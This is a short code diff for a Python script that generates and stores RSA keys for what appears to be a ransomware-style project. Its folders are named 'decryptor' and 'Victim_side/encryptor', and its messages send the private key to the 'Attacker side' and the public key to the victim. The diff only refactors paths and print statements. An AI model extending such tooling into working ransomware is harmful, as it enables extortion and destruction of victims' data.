@@ -22,12 +22,12 @@ def generate_rsa_keys():
 def prepare_folders():
     # Create folder structure in a safe, cross-platform way
     try:
-        pri_dir = os.path.join(os.getcwd(), "../decryptor")
-        pub_dir = os.path.join(os.getcwd(), "../../Victim_side/encryptor")
+        BASE_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
+        pri_dir = os.path.join(BASE_PATH, "decryptor")
+        pub_dir = os.path.join(BASE_PATH, "..", "Victim_side", "encryptor")
 
         os.makedirs(pri_dir, exist_ok=True)
         os.makedirs(pub_dir, exist_ok=True)
-        print(f"[+] Folders ready: {pri_dir}, {pub_dir}")
         return pri_dir, pub_dir
 
     except Exception as e:
@@ -62,8 +62,8 @@ def save_keys(private_key, public_key, pri_dir, pub_dir):
             )
 
         print("[✓] Keys saved successfully.")
-        print(f"    → {private_file}")
-        print(f"    → {public_file}")
+        print(f"Private Key → Store in Attacker side.")
+        print(f"Public Key → Store in Victim side.")
 
     except Exception as e:
         print(f"[ERROR] Failed to save keys: {e}")
